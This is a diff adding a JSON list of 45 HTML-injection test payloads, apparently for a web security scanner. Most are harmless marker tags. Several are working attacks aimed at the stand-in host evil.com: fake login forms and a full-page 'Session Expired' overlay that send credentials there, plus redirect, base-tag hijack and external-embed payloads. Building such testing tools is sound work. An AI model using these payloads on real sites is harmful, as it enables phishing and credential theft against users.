@@ -1,0 +1,452 @@
+[
+  {
+    "id": "htmli-001",
+    "family": "htmli",
+    "subtype": "bare_tag",
+    "payload_string": "<h1>Injected</h1>",
+    "context": "html",
+    "description": "Basic H1 tag injection to confirm HTML rendering",
+    "references": ["https://owasp.org/www-community/attacks/HTML_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "htmli-002",
+    "family": "htmli",
+    "subtype": "bare_tag",
+    "payload_string": "<b>HTMLi-PROBE-9271</b>",
+    "context": "html",
+    "description": "Bold tag with unique marker for definitive reflection confirmation",
+    "references": ["https://owasp.org/www-community/attacks/HTML_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "htmli-003",
+    "family": "htmli",
+    "subtype": "bare_tag",
+    "payload_string": "<marquee>Injected Content</marquee>",
+    "context": "html",
+    "description": "Marquee tag injection — scrolling content indicator",
+    "references": ["https://owasp.org/www-community/attacks/HTML_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "htmli-004",
+    "family": "htmli",
+    "subtype": "phishing_form",
+    "payload_string": "<form action=\"http://evil.com/steal\" method=\"POST\"><input type=\"text\" name=\"user\" placeholder=\"Username\"><input type=\"password\" name=\"pass\" placeholder=\"Password\"><input type=\"submit\" value=\"Login\"></form>",
+    "context": "html",
+    "description": "Phishing login form injection",
+    "references": ["https://owasp.org/www-community/attacks/HTML_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "htmli-005",
+    "family": "htmli",
+    "subtype": "meta_redirect",
+    "payload_string": "<meta http-equiv=\"refresh\" content=\"0;url=http://evil.com\">",
+    "context": "html",
+    "description": "Meta refresh redirect injection",
+    "references": ["https://owasp.org/www-community/attacks/HTML_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "htmli-006",
+    "family": "htmli",
+    "subtype": "base_hijack",
+    "payload_string": "<base href=\"http://evil.com/\">",
+    "context": "html",
+    "description": "Base tag hijacking — redirects all relative URLs",
+    "references": ["https://owasp.org/www-community/attacks/HTML_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "htmli-007",
+    "family": "htmli",
+    "subtype": "link_inject",
+    "payload_string": "<link rel=\"stylesheet\" href=\"http://evil.com/evil.css\">",
+    "context": "html",
+    "description": "External CSS injection via link tag",
+    "references": ["https://owasp.org/www-community/attacks/HTML_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "htmli-008",
+    "family": "htmli",
+    "subtype": "attribute",
+    "payload_string": "\" style=\"background-color:red;font-size:50px\" x=\"",
+    "context": "attribute",
+    "description": "HTML attribute injection to break out of attribute context",
+    "references": ["https://owasp.org/www-community/attacks/HTML_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "htmli-009",
+    "family": "htmli",
+    "subtype": "attribute",
+    "payload_string": "' style='color:red;font-size:50px",
+    "context": "attribute",
+    "description": "Single-quote attribute injection",
+    "references": ["https://owasp.org/www-community/attacks/HTML_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "htmli-010",
+    "family": "htmli",
+    "subtype": "image_probe",
+    "payload_string": "<img src=\"http://evil.com/probe.gif\" alt=\"probe\">",
+    "context": "html",
+    "description": "Image tag injection for SSRF probe and content injection",
+    "references": ["https://owasp.org/www-community/attacks/HTML_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "htmli-011",
+    "family": "htmli",
+    "subtype": "bare_tag",
+    "payload_string": "<p>INJECTED_TEXT_PROBE</p>",
+    "context": "html",
+    "description": "Paragraph tag injection with unique probe marker",
+    "references": ["https://owasp.org/www-community/attacks/HTML_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "htmli-012",
+    "family": "htmli",
+    "subtype": "bare_tag",
+    "payload_string": "<hr/>",
+    "context": "html",
+    "description": "Horizontal rule injection — minimal tag for rendering test",
+    "references": ["https://owasp.org/www-community/attacks/HTML_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "htmli-013",
+    "family": "htmli",
+    "subtype": "bare_tag",
+    "payload_string": "<strong>HTMLi-CONFIRMED</strong>",
+    "context": "html",
+    "description": "Strong tag injection with unique marker",
+    "references": ["https://owasp.org/www-community/attacks/HTML_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "htmli-014",
+    "family": "htmli",
+    "subtype": "iframe_inject",
+    "payload_string": "<iframe src=\"http://evil.com\" width=\"100%\" height=\"500\"></iframe>",
+    "context": "html",
+    "description": "Iframe injection for content spoofing",
+    "references": ["https://owasp.org/www-community/attacks/HTML_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "htmli-015",
+    "family": "htmli",
+    "subtype": "bare_tag",
+    "payload_string": "</div><h2>HTMLi-BREAK-OUT</h2><div>",
+    "context": "html",
+    "description": "Context break-out injection using closing div",
+    "references": ["https://owasp.org/www-community/attacks/HTML_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "htmli-016",
+    "family": "htmli",
+    "subtype": "svg_inject",
+    "payload_string": "<svg width=\"200\" height=\"50\"><text x=\"10\" y=\"30\" fill=\"red\">INJECTED</text></svg>",
+    "context": "html",
+    "description": "SVG-based content injection",
+    "references": ["https://owasp.org/www-community/attacks/HTML_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "htmli-017",
+    "family": "htmli",
+    "subtype": "meta_redirect",
+    "payload_string": "</title><meta http-equiv=\"refresh\" content=\"5;url=http://evil.com\">",
+    "context": "html",
+    "description": "Title tag break-out with meta redirect",
+    "references": ["https://owasp.org/www-community/attacks/HTML_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "htmli-018",
+    "family": "htmli",
+    "subtype": "phishing_form",
+    "payload_string": "<div style=\"position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:9999\"><h2>Session Expired - Please Login</h2><form action=\"http://evil.com\"><input name=\"u\" placeholder=\"Username\"><input type=\"password\" name=\"p\" placeholder=\"Password\"><button>Login</button></form></div>",
+    "context": "html",
+    "description": "Full-page overlay phishing form injection",
+    "references": ["https://owasp.org/www-community/attacks/HTML_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "htmli-019",
+    "family": "htmli",
+    "subtype": "encoded",
+    "payload_string": "&lt;h1&gt;HTML injection test&lt;/h1&gt;",
+    "context": "html",
+    "description": "HTML-encoded injection to test double-decoding",
+    "references": ["https://owasp.org/www-community/attacks/HTML_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "htmli-020",
+    "family": "htmli",
+    "subtype": "bare_tag",
+    "payload_string": "<details><summary>INJECTED</summary>Hidden content here</details>",
+    "context": "html",
+    "description": "Details/summary disclosure tag injection",
+    "references": ["https://owasp.org/www-community/attacks/HTML_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "htmli-021",
+    "family": "htmli",
+    "subtype": "attribute",
+    "payload_string": "\"><h1>Injected",
+    "context": "attribute",
+    "description": "Break out of double-quote attribute into HTML context",
+    "references": ["https://owasp.org/www-community/attacks/HTML_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "htmli-022",
+    "family": "htmli",
+    "subtype": "attribute",
+    "payload_string": "'><h1>Injected",
+    "context": "attribute",
+    "description": "Break out of single-quote attribute into HTML context",
+    "references": ["https://owasp.org/www-community/attacks/HTML_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "htmli-023",
+    "family": "htmli",
+    "subtype": "link_inject",
+    "payload_string": "<link rel=\"canonical\" href=\"http://evil.com\">",
+    "context": "html",
+    "description": "Canonical link injection for SEO manipulation",
+    "references": ["https://owasp.org/www-community/attacks/HTML_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "htmli-024",
+    "family": "htmli",
+    "subtype": "bare_tag",
+    "payload_string": "<table><tr><td>CELL-INJECTED</td></tr></table>",
+    "context": "html",
+    "description": "Table element injection for layout disruption",
+    "references": ["https://owasp.org/www-community/attacks/HTML_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "htmli-025",
+    "family": "htmli",
+    "subtype": "bare_tag",
+    "payload_string": "<input type=\"text\" value=\"HTMLi\" autofocus>",
+    "context": "html",
+    "description": "Input element injection with autofocus",
+    "references": ["https://owasp.org/www-community/attacks/HTML_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "htmli-026",
+    "family": "htmli",
+    "subtype": "bare_tag",
+    "payload_string": "<video src=\"http://evil.com/v.mp4\" autoplay>",
+    "context": "html",
+    "description": "Video tag injection for media content spoofing",
+    "references": ["https://owasp.org/www-community/attacks/HTML_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "htmli-027",
+    "family": "htmli",
+    "subtype": "encoded",
+    "payload_string": "%3Ch1%3EInjected%3C%2Fh1%3E",
+    "context": "html",
+    "description": "URL-encoded HTML injection",
+    "references": ["https://owasp.org/www-community/attacks/HTML_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "htmli-028",
+    "family": "htmli",
+    "subtype": "bare_tag",
+    "payload_string": "<blink>INJECTED_BLINK</blink>",
+    "context": "html",
+    "description": "Blink tag injection (legacy browser support probe)",
+    "references": ["https://owasp.org/www-community/attacks/HTML_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "htmli-029",
+    "family": "htmli",
+    "subtype": "attribute",
+    "payload_string": "x\" title=\"HTMLi-ATTR-INJECTED",
+    "context": "attribute",
+    "description": "Title attribute injection for tooltip spoofing",
+    "references": ["https://owasp.org/www-community/attacks/HTML_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "htmli-030",
+    "family": "htmli",
+    "subtype": "bare_tag",
+    "payload_string": "<abbr title=\"HTML Injection Confirmed\">HTMLI</abbr>",
+    "context": "html",
+    "description": "Abbreviation tag with tooltip title injection",
+    "references": ["https://owasp.org/www-community/attacks/HTML_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "htmli-031",
+    "family": "htmli",
+    "subtype": "bare_tag",
+    "payload_string": "<blockquote>Injected blockquote content</blockquote>",
+    "context": "html",
+    "description": "Blockquote tag injection for content spoofing",
+    "references": ["https://owasp.org/www-community/attacks/HTML_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "htmli-032",
+    "family": "htmli",
+    "subtype": "bare_tag",
+    "payload_string": "<mark>HTMLI-HIGHLIGHT</mark>",
+    "context": "html",
+    "description": "Mark tag injection for text highlighting",
+    "references": ["https://owasp.org/www-community/attacks/HTML_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "htmli-033",
+    "family": "htmli",
+    "subtype": "bare_tag",
+    "payload_string": "<script src=\"\"></script><b>HTMLi</b>",
+    "context": "html",
+    "description": "Empty script tag followed by bold — tests filter bypasses",
+    "references": ["https://owasp.org/www-community/attacks/HTML_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "htmli-034",
+    "family": "htmli",
+    "subtype": "meta_redirect",
+    "payload_string": "<meta name=\"description\" content=\"HTMLI-META-INJECT\">",
+    "context": "html",
+    "description": "Meta description content injection",
+    "references": ["https://owasp.org/www-community/attacks/HTML_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "htmli-035",
+    "family": "htmli",
+    "subtype": "bare_tag",
+    "payload_string": "<q>INJECTED-QUOTE</q>",
+    "context": "html",
+    "description": "Quote element injection",
+    "references": ["https://owasp.org/www-community/attacks/HTML_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "htmli-036",
+    "family": "htmli",
+    "subtype": "bare_tag",
+    "payload_string": "<object data=\"http://evil.com/evil.swf\"></object>",
+    "context": "html",
+    "description": "Object element injection for external content embedding",
+    "references": ["https://owasp.org/www-community/attacks/HTML_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "htmli-037",
+    "family": "htmli",
+    "subtype": "bare_tag",
+    "payload_string": "<embed src=\"http://evil.com/evil.pdf\">",
+    "context": "html",
+    "description": "Embed element injection",
+    "references": ["https://owasp.org/www-community/attacks/HTML_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "htmli-038",
+    "family": "htmli",
+    "subtype": "phishing_form",
+    "payload_string": "<a href=\"http://evil.com\" style=\"font-size:20px;color:red\">CLICK HERE - Your account has been compromised</a>",
+    "context": "html",
+    "description": "Social engineering anchor injection",
+    "references": ["https://owasp.org/www-community/attacks/HTML_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "htmli-039",
+    "family": "htmli",
+    "subtype": "bare_tag",
+    "payload_string": "<pre>INJECTED-PREFORMATTED</pre>",
+    "context": "html",
+    "description": "Preformatted text tag injection",
+    "references": ["https://owasp.org/www-community/attacks/HTML_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "htmli-040",
+    "family": "htmli",
+    "subtype": "bare_tag",
+    "payload_string": "<code>INJECTED-CODE-BLOCK</code>",
+    "context": "html",
+    "description": "Code element injection",
+    "references": ["https://owasp.org/www-community/attacks/HTML_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "htmli-041",
+    "family": "htmli",
+    "subtype": "attribute",
+    "payload_string": "x\" data-htmli=\"confirmed\" alt=\"",
+    "context": "attribute",
+    "description": "Data attribute injection for fingerprinting",
+    "references": ["https://owasp.org/www-community/attacks/HTML_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "htmli-042",
+    "family": "htmli",
+    "subtype": "bare_tag",
+    "payload_string": "<ul><li>INJECTED-LIST-ITEM</li></ul>",
+    "context": "html",
+    "description": "Unordered list injection",
+    "references": ["https://owasp.org/www-community/attacks/HTML_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "htmli-043",
+    "family": "htmli",
+    "subtype": "bare_tag",
+    "payload_string": "<del>DELETED-CONTENT-HTMLI</del><ins>REPLACED-HTMLI</ins>",
+    "context": "html",
+    "description": "Del/ins element injection for content manipulation appearance",
+    "references": ["https://owasp.org/www-community/attacks/HTML_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "htmli-044",
+    "family": "htmli",
+    "subtype": "bare_tag",
+    "payload_string": "<sup>HTMLI-SUP</sup>",
+    "context": "html",
+    "description": "Superscript element injection",
+    "references": ["https://owasp.org/www-community/attacks/HTML_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "htmli-045",
+    "family": "htmli",
+    "subtype": "bare_tag",
+    "payload_string": "<figure><figcaption>HTMLI-FIGURE</figcaption></figure>",
+    "context": "html",
+    "description": "Figure/figcaption element injection",
+    "references": ["https://owasp.org/www-community/attacks/HTML_Injection"],
+    "platform_specific": {}
+  }
+]
